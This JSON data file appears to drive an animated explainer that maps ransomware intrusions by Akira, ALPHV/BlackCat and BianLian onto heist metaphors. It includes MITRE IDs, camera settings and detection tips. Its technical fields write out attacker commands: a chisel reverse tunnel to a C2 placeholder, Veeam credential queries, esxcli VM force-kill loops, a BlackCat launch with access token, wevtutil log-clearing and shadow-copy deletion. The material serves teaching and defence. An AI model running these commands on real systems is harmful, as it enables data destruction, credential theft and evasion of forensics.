          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Safe",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Corporate backup-scheduler credential safe",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses corporate backup-scheduler credential safe to advance toward unwrapping the locked backup safe keys.",
          "technicalParallel": "Pivoting to an internal Windows server, the operator launched chisel.exe client https://<c2>:8443 R:socks (establishing a fast TCP-over-HTTP/WebSocket reverse SOCKS5 tunnel) and queried the local…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Safe Keys",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Stairwell leading straight to the basement racks",
          "storyExcerpt": "Behind the scenes, stairwell leading straight to the basement racks captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Alert on Sysmon EventID 1 (Process Creation recording command lines) for chisel.exe reverse proxy launches or sqlcmd.exe querying [VeeamBackup].[dbo].[Credentials] paired with unexpected DPAPI…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Door",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1555"
    },
    "step-3": {
      "scenarioId": "akira-ransomware-cisco-anyconnect-esxi",
      "sectionKey": "step-3",
      "sceneKind": "ran-akira-esxi-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption",
      "storyCue": "Descending into the basement hypervisor hall with stolen master keys, the intruder flips the hard power breakers on every running virtual office so their disk bolts release, then unleashes a fast Rust padlocking machine that encrypts entire virtual servers in minutes.",
      "technicalCue": "T1489 · EXFIL & IMPACT — Using the stolen ESXi credentials over SSH, the operator executed a shell loop invoking esxcli vm process list and esxcli vm process kill --type=force --world-id=<id> (forcefully terminating…",
      "storyMappings": [
        {
          "storyTerm": "Flipping hard power breakers on running virtual offices",
          "technicalTerm": "Shell loop invoking esxcli vm process list and esxcli vm process kill --type=force",
          "tone": "amber"
        },
        {
          "storyTerm": "Releasing heavy disk bolts",
          "technicalTerm": "Releasing exclusive hypervisor locks held on *-flat.vmdk virtual disk files",
          "tone": "sky"
        },
        {
          "storyTerm": "Fast Rust padlocking machine",
          "technicalTerm": "Linux ELF Rust-compiled Akira ESXi encryptor launched from /tmp",
          "tone": "rose"
        },
        {
          "storyTerm": "Basement audit logs recording the shutdowns",
          "technicalTerm": "ESXi /var/log/shell.log and /var/log/hostd.log forwarded off-host to SIEM",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-akira-esxi-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Flipping hard power breakers on running…",
          "subtitle": "Shell loop invoking esxcli vm process list and esxcli vm…",
          "tone": "amber"
        },
        {
          "id": "ran-akira-esxi-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Releasing heavy disk bolts",
          "subtitle": "Releasing exclusive hypervisor locks held on *-flat.vmdk…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Hard",
          "stageTag": "STEP 03 · SETUP",
          "title": "Flipping hard power breakers on running virtual…",
          "storyExcerpt": "Descending into the basement hypervisor hall with stolen master keys, the intruder flips the hard power breakers on every running virtual office so their disk bolts release, then unleashes a…",
          "technicalParallel": "Because most enterprises do not install EDR agents directly inside the proprietary VMware ESXi VMkernel OS, encrypting from the hypervisor shell bypasses all guest-OS Windows/Linux EDR agents installed…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Disk",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Releasing heavy disk bolts",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses releasing heavy disk bolts to advance toward fast rust padlocking machine.",
          "technicalParallel": "Using the stolen ESXi credentials over SSH, the operator executed a shell loop invoking esxcli vm process list and esxcli vm process kill --type=force --world-id=<id> (forcefully terminating every…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Fast Rust",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Basement audit logs recording the shutdowns",
          "storyExcerpt": "Behind the scenes, basement audit logs recording the shutdowns captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Forward ESXi /var/log/shell.log and /var/log/hostd.log off-host to a central SIEM (preserving hypervisor audit records before local wipe) and alert immediately on esxcli vm process kill bursts paired…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Door",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1489"
    }
  },
  "alphv-blackcat-sphynx-rust-impacket-exmatter": {
    "briefing": {
      "scenarioId": "alphv-blackcat-sphynx-rust-impacket-exmatter",
      "sectionKey": "briefing",
      "sceneKind": "ran-blackcat-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1048.002",
      "title": "ALPHV / BlackCat (Sphynx) Rust Ransomware, ExMatter Exfiltration &… — Story-to-Technical Overview",
      "storyCue": "Imagine a disciplined heist syndicate carrying three precision tools across a corporate campus. First, a silent courier sweeps high-value folders out to an external van and burns its own footprints behind it; next, the syndicate unlocks a locked briefcase using a unique job passcode, opens cross-room shortcut paths, and shreds every backup binder; finally, the briefcase automatically copies itself down every corridor and basement server rack to snap fast modern locks across both office desks and virtual servers at once.",
      "technicalCue": "EXFIL & IMPACT: ExMatter .NET Data Exfiltration & Self-Erasure Before Encryption -> DEFENSE EVASION: Access-Token Unpacking (-k), fsutil R2R Symlink Enablement & Shadow Wipe -> EXFIL & IMPACT: Embedded Impacket PsExec Propagation, ESXi VM Kill & AES-CTR/ChaCha20 Encryption",
      "storyMappings": [
        {
          "storyTerm": "Silent courier sweeping folders out and burning its footprints",
          "technicalTerm": "ExMatter .NET exfiltration tool staging data and self-erasing prior to encryption",
          "tone": "amber"
        },
        {
          "storyTerm": "Unlocking a briefcase with a unique job passcode and opening shortcuts",
          "technicalTerm": "Rust BlackCat/Sphynx -k <access_token>, fsutil R2R symlink enablement, and shadow wipe",
          "tone": "sky"
        },
        {
          "storyTerm": "Copying itself automatically down every corridor and basement rack",
          "technicalTerm": "Embedded NetExec/Impacket --propagate PsExec worm and ESXi VM termination",
          "tone": "rose"
        },
        {
          "storyTerm": "Fast modern locks snapped across desks and virtual servers",
          "technicalTerm": "Cross-platform Rust AES-CTR and ChaCha20 encryption across Windows and ESXi",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-blackcat-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Silent courier sweeping folders out and…",
          "subtitle": "ExMatter .NET exfiltration tool staging data and self-erasing…",
          "tone": "amber"
        },
        {
          "id": "ran-blackcat-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Unlocking a briefcase with a unique job…",
          "subtitle": "Rust BlackCat/Sphynx -k <access_token>, fsutil R2R symlink…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. File-gathering",
          "stageTag": "STAGE 01 · EXFIL & IMPACT",
          "title": "ExMatter .NET Data Exfiltration & Self-Erasure Before Encryption",
          "storyExcerpt": "Before locking a single door, the affiliate deploys a quiet file-gathering courier disguised as routine office paperwork that filters out junk, packs high-value contracts onto an external truck, and…",
          "technicalParallel": "Under the hood, the observed step executes C:\\ProgramData\\ExMatter.exe (Enumerates .docx.xlsx.pdf.dwg across C:\\..Z:\\ -> SFTP/WebDAV upload) (which executes the technical command / telemetry directive…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Rust Job",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Access-Token Unpacking (-k), fsutil R2R Symlink Enablement & Shadow Wipe",
          "storyExcerpt": "The operator unlocks the Rust padlocking briefcase by typing a secret job token on the command line (keeping the inner blueprint scrambled from curious analysts), flips a building shortcut switch so…",
          "technicalParallel": "Under the hood, the observed step executes bcat_sphynx.exe -k 8f94a2c1e0b74d19a3c8f5e2d1b09876 --propagate (which executes the technical command / telemetry directive , bcat_sphynx.exe -k…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Down",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Embedded Impacket PsExec Propagation, ESXi VM Kill & AES-CTR/ChaCha20 Encryption",
          "storyExcerpt": "Armed with stolen master passes packed inside its own pocket, the briefcase marches itself down every office hallway and into the basement hypervisor room, halting running virtual servers and locking…",
          "technicalParallel": "Under the hood, the observed step executes for /F \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\" (which invokes the Windows Event Collector CLI utility , wevtutil.exe with the cl…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Exfil Chute",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Blades",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cipher Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "alphv-blackcat-sphynx-rust-impacket-exmatter",
      "sectionKey": "step-1",
      "sceneKind": "ran-blackcat-step-1",
      "stageBadge": "STEP #1 · EXFIL & IMPACT",
      "title": "ExMatter .NET Data Exfiltration & Self-Erasure Before Encryption",
      "storyCue": "Before locking a single door, the affiliate deploys a quiet file-gathering courier disguised as routine office paperwork that filters out junk, packs high-value contracts onto an external truck, and erases its own executable file when finished.",
      "technicalCue": "T1048.002 · EXFIL & IMPACT — Before deploying the encryptor, the ALPHV affiliate stages ExMatter (a compiled .NET exfiltration utility disguised as Svchost.exe orighosting in C:\\ProgramData) that enumerates all local and…",
      "storyMappings": [
        {
          "storyTerm": "Quiet file-gathering courier disguised as routine paperwork",
          "technicalTerm": "Compiled .NET ExMatter utility enumerating high-value file extensions",
          "tone": "amber"
        },
        {
          "storyTerm": "Packing contracts onto an external truck",
          "technicalTerm": "Automated SFTP/WebDAV exfiltration to affiliate-controlled servers",
          "tone": "sky"
        },
        {
          "storyTerm": "Erasing its own footprints upon completion",
          "technicalTerm": "Self-deletion routine overwriting or removing the ExMatter binary post-theft",
          "tone": "rose"
        },
        {
          "storyTerm": "Double-extortion leverage secured first",
          "technicalTerm": "Stolen corporate data guaranteed before noisy encryption triggers alarms",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-blackcat-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Quiet file-gathering courier disguised…",
          "subtitle": "Compiled .NET ExMatter utility enumerating high-value file…",
          "tone": "amber"
        },
        {
          "id": "ran-blackcat-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Packing contracts onto an external truck",
          "subtitle": "Automated SFTP/WebDAV exfiltration to affiliate-controlled…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. File-gathering",
          "stageTag": "STEP 01 · SETUP",
          "title": "Quiet file-gathering courier disguised as routine…",
          "storyExcerpt": "Before locking a single door, the affiliate deploys a quiet file-gathering courier disguised as routine office paperwork that filters out junk, packs high-value contracts onto an external…",
          "technicalParallel": "Under the hood, the observed step executes C:\\ProgramData\\ExMatter.exe (Enumerates .docx.xlsx.pdf.dwg across C:\\..Z:\\ -> SFTP/WebDAV upload) (which executes the technical command / telemetry directive…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Onto",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Packing contracts onto an external truck",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses packing contracts onto an external truck to advance toward erasing its own footprints upon completion.",
          "technicalParallel": "Before deploying the encryptor, the ALPHV affiliate stages ExMatter (a compiled .NET exfiltration utility disguised as Svchost.exe orighosting in C:\\ProgramData) that enumerates all local and mounted…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Own Upon",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Double-extortion leverage secured first",
          "storyExcerpt": "Behind the scenes, double-extortion leverage secured first captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording ExfiltrationTool=ExMatter .NET SFTP/WebDAV Stealer, TargetedExtensions=.docx.xlsx.pdf.sql.bak.vmdk, AntiForensics=WriteAllBytes Zero-Overwrite + Remove-Item…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Exfil Chute",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Blades",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cipher Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1048.002"
    },
    "step-2": {
      "scenarioId": "alphv-blackcat-sphynx-rust-impacket-exmatter",
      "sectionKey": "step-2",
      "sceneKind": "ran-blackcat-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Access-Token Unpacking (-k), fsutil R2R Symlink Enablement & Shadow Wipe",
      "storyCue": "The operator unlocks the Rust padlocking briefcase by typing a secret job token on the command line (keeping the inner blueprint scrambled from curious analysts), flips a building shortcut switch so linked remote hallways stay reachable, and shreds every backup snapshot.",
      "technicalCue": "T1490 · DEFENSE EVASION — The operator executes the Rust-compiled BlackCat/Sphynx binary with -k <access_token> (which derives the ChaCha20 key to decrypt the embedded JSON configuration), runs fsutil behavior set…",
      "storyMappings": [
        {
          "storyTerm": "Secret job token unlocking the scrambled briefcase",
          "technicalTerm": "Mandatory -k <access_token> CLI key deriving the internal ChaCha20 config key",
          "tone": "amber"
        },
        {
          "storyTerm": "Flipping a building shortcut switch for remote hallways",
          "technicalTerm": "fsutil behavior set SymlinkEvaluation R2L:1 R2R:1 enabling remote symlink traversal",
          "tone": "sky"
        },
        {
          "storyTerm": "Shredding every backup snapshot",
          "technicalTerm": "vssadmin / WMI Volume Shadow Copy deletion and event log clearing",
          "tone": "rose"
        },
        {
          "storyTerm": "Scrambling the blueprint against casual inspection",
          "technicalTerm": "Encrypted embedded JSON affiliate configuration protecting credentials and keys",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-blackcat-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Secret job token unlocking the scrambled…",
          "subtitle": "Mandatory -k <access_token> CLI key deriving the internal…",
          "tone": "amber"
        },
        {
          "id": "ran-blackcat-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Flipping a building shortcut switch for…",
          "subtitle": "fsutil behavior set SymlinkEvaluation R2L:1 R2R:1 enabling…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Rust Job",
          "stageTag": "STEP 02 · SETUP",
          "title": "Secret job token unlocking the scrambled briefcase",
          "storyExcerpt": "The operator unlocks the Rust padlocking briefcase by typing a secret job token on the command line (keeping the inner blueprint scrambled from curious analysts), flips a building shortcut…",
          "technicalParallel": "Under the hood, the observed step executes bcat_sphynx.exe -k 8f94a2c1e0b74d19a3c8f5e2d1b09876 --propagate (which executes the technical command / telemetry directive , bcat_sphynx.exe -k…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Flipping a building shortcut switch for remote…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses flipping a building shortcut switch for remote hallways to advance toward shredding every backup snapshot.",
          "technicalParallel": "The operator executes the Rust-compiled BlackCat/Sphynx binary with -k <access_token> (which derives the ChaCha20 key to decrypt the embedded JSON configuration), runs fsutil behavior set…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Rust Job",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Scrambling the blueprint against casual inspection",
          "storyExcerpt": "Behind the scenes, scrambling the blueprint against casual inspection captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording ParentBinary=bcat_sphynx.exe , Rust ALPHV/BlackCat Sphynx, AccessTokenSwitch=-k 8f94a2c1e0b74d19a3c8f5e2d1b09876, SymlinkEvaluation=R2L:1 R2R:1 Enabled under…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Exfil Chute",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Blades",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cipher Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1490"
    },
    "step-3": {
      "scenarioId": "alphv-blackcat-sphynx-rust-impacket-exmatter",
      "sectionKey": "step-3",
      "sceneKind": "ran-blackcat-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Embedded Impacket PsExec Propagation, ESXi VM Kill & AES-CTR/ChaCha20 Encryption",
      "storyCue": "Armed with stolen master passes packed inside its own pocket, the briefcase marches itself down every office hallway and into the basement hypervisor room, halting running virtual servers and locking both Windows offices and Linux server pods simultaneously.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Using credentials harvested via built-in NetExec/Impacket routines (--propagate), BlackCat spreads across SMB shares, clears all Windows Event Logs via wevtutil.exe cl, kills VMware ESXi…",
      "storyMappings": [
        {
          "storyTerm": "Marching itself down every office hallway",
          "technicalTerm": "Built-in --propagate routine using embedded Impacket/PsExec over SMB with harvested creds",
          "tone": "amber"
        },
        {
          "storyTerm": "Halting running virtual servers in the basement",
          "technicalTerm": "Automated ESXi esxcli vm process kill releasing virtual disk locks",
          "tone": "sky"
        },
        {
          "storyTerm": "Locking both Windows offices and Linux pods simultaneously",
          "technicalTerm": "Multi-threaded Rust AES-CTR and ChaCha20 encryption across platforms",
          "tone": "rose"
        },
        {
          "storyTerm": "Hardware-accelerated locking speed",
          "technicalTerm": "Dynamic selection of AES-NI hardware cipher or ChaCha20 software fallback",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-blackcat-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Marching itself down every office hallway",
          "subtitle": "Built-in --propagate routine using embedded Impacket/PsExec…",
          "tone": "amber"
        },
        {
          "id": "ran-blackcat-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Halting running virtual servers in the…",
          "subtitle": "Automated ESXi esxcli vm process kill releasing virtual disk…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Down",
          "stageTag": "STEP 03 · SETUP",
          "title": "Marching itself down every office hallway",
          "storyExcerpt": "Armed with stolen master passes packed inside its own pocket, the briefcase marches itself down every office hallway and into the basement hypervisor room, halting running virtual servers and…",
          "technicalParallel": "Under the hood, the observed step executes for /F \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\" (which invokes the Windows Event Collector CLI utility , wevtutil.exe with the cl…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Both",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Halting running virtual servers in the basement",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses halting running virtual servers in the basement to advance toward locking both windows offices and linux pods simultaneously.",
          "technicalParallel": "Using credentials harvested via built-in NetExec/Impacket routines (--propagate), BlackCat spreads across SMB shares, clears all Windows Event Logs via wevtutil.exe cl, kills VMware ESXi virtual machines…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Both Pods",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Hardware-accelerated locking speed",
          "storyExcerpt": "Behind the scenes, hardware-accelerated locking speed captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=ALPHV / BlackCat , Sphynx Rust Variant, EncryptionMode=AES-128-CTR , Hardware AES-NI / ChaCha20 + RSA-2048, RansomNote=RECOVER-sphynx-FILES.txt…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Exfil Chute",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Blades",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cipher Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "bianlian-extortion-go-backdoor-rdp": {
    "briefing": {
      "scenarioId": "bianlian-extortion-go-backdoor-rdp",
      "sectionKey": "briefing",
      "sceneKind": "ran-bianlian-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1573.002",
      "title": "BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion… — Story-to-Technical Overview",
      "storyCue": "Imagine a slick extortion crew that decides padlocking a building is too loud and attracts every fire alarm on the block. Instead, they craft a custom one-of-a-kind secret radio tailored for that single victim, split that single radio line into dozens of parallel whispering corridors to map every shared file room, and quietly truck out every confidential blueprint in disguised moving vans so they can threaten public exposure without ever breaking a single lock.",
      "technicalCue": "LATERAL & C2: Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning -> LATERAL & C2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot -> EXFIL & IMPACT: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)",
      "storyMappings": [
        {
          "storyTerm": "Custom one-of-a-kind secret radio tailored for one victim",
          "technicalTerm": "Per-victim compiled Golang mTLS backdoor with hardcoded X.509 certificate pinning",
          "tone": "amber"
        },
        {
          "storyTerm": "Splitting one radio line into dozens of parallel whispering corridors",
          "technicalTerm": "In-memory hashicorp/yamux multiplexing paired with armon/go-socks5 lateral proxy",
          "tone": "sky"
        },
        {
          "storyTerm": "Mapping every shared file room silently",
          "technicalTerm": "SharpShares enumerating accessible SMB shares across internal servers",
          "tone": "rose"
        },
        {
          "storyTerm": "Trucking out blueprints without breaking a single lock",
          "technicalTerm": "Pure data-exfiltration extortion via renamed rclone.exe (Win.exe) and FTP with zero encryption",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-bianlian-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Custom one-of-a-kind secret radio…",
          "subtitle": "Per-victim compiled Golang mTLS backdoor with hardcoded X.509…",
          "tone": "amber"
        },
        {
          "id": "ran-bianlian-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Splitting one radio line into dozens of…",
          "subtitle": "In-memory hashicorp/yamux multiplexing paired with…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. One-of-a-kind",
          "stageTag": "STAGE 01 · LATERAL & C2",
          "title": "Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning",
          "storyExcerpt": "Right after crossing the perimeter, the crew drops a bespoke compact radio built specifically for this single victim that refuses to speak to anyone except one hardcoded wax-sealed command tower…",
          "technicalParallel": "Because the C2 IP and X.509 certificates are compiled directly into each binary right before deployment, every victim receives a distinct file hash.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. One Line",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot",
          "storyExcerpt": "Over that single quiet encrypted radio line, the backdoor splits open dozens of virtual internal hallway lanes at once, allowing remote operators to probe internal file rooms and directory cabinets as if…",
          "technicalParallel": "By centralizing C2 and proxying inside a single lightweight Go binary that contains zero exploit code or encryption routines, BianLian minimizes its endpoint footprint across the domain.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Keep",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)",
          "storyExcerpt": "Leaving every filing cabinet unlocked so anti-lockdown alarms stay completely silent, the crew renames a standard cloud-sync moving van to blend into Windows utilities, hauls out gigabytes of corporate…",
          "technicalParallel": "Even when rclone.exe is renamed to Win.exe or svchost.exe, its PE version-info header (OriginalFileName: rclone.exe) and Go symbol table remain intact and detectable by YARA/Sysmon.",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Radio Line",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "File Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Tunnel Split",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "bianlian-extortion-go-backdoor-rdp",
      "sectionKey": "step-1",
      "sceneKind": "ran-bianlian-step-1",
      "stageBadge": "STEP #1 · LATERAL & C2",
      "title": "Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning",
      "storyCue": "Right after crossing the perimeter, the crew drops a bespoke compact radio built specifically for this single victim that refuses to speak to anyone except one hardcoded wax-sealed command tower, preventing security analysts from impersonating or hijacking the line.",
      "technicalCue": "T1573.002 · LATERAL & C2 — After initial entry, BianLian dropped a uniquely compiled 64-bit Golang executable (masquerading under Windows system filenames like SystemSettingsAdminFlows.exe or Win64Ark.exe) that initiated…",
      "storyMappings": [
        {
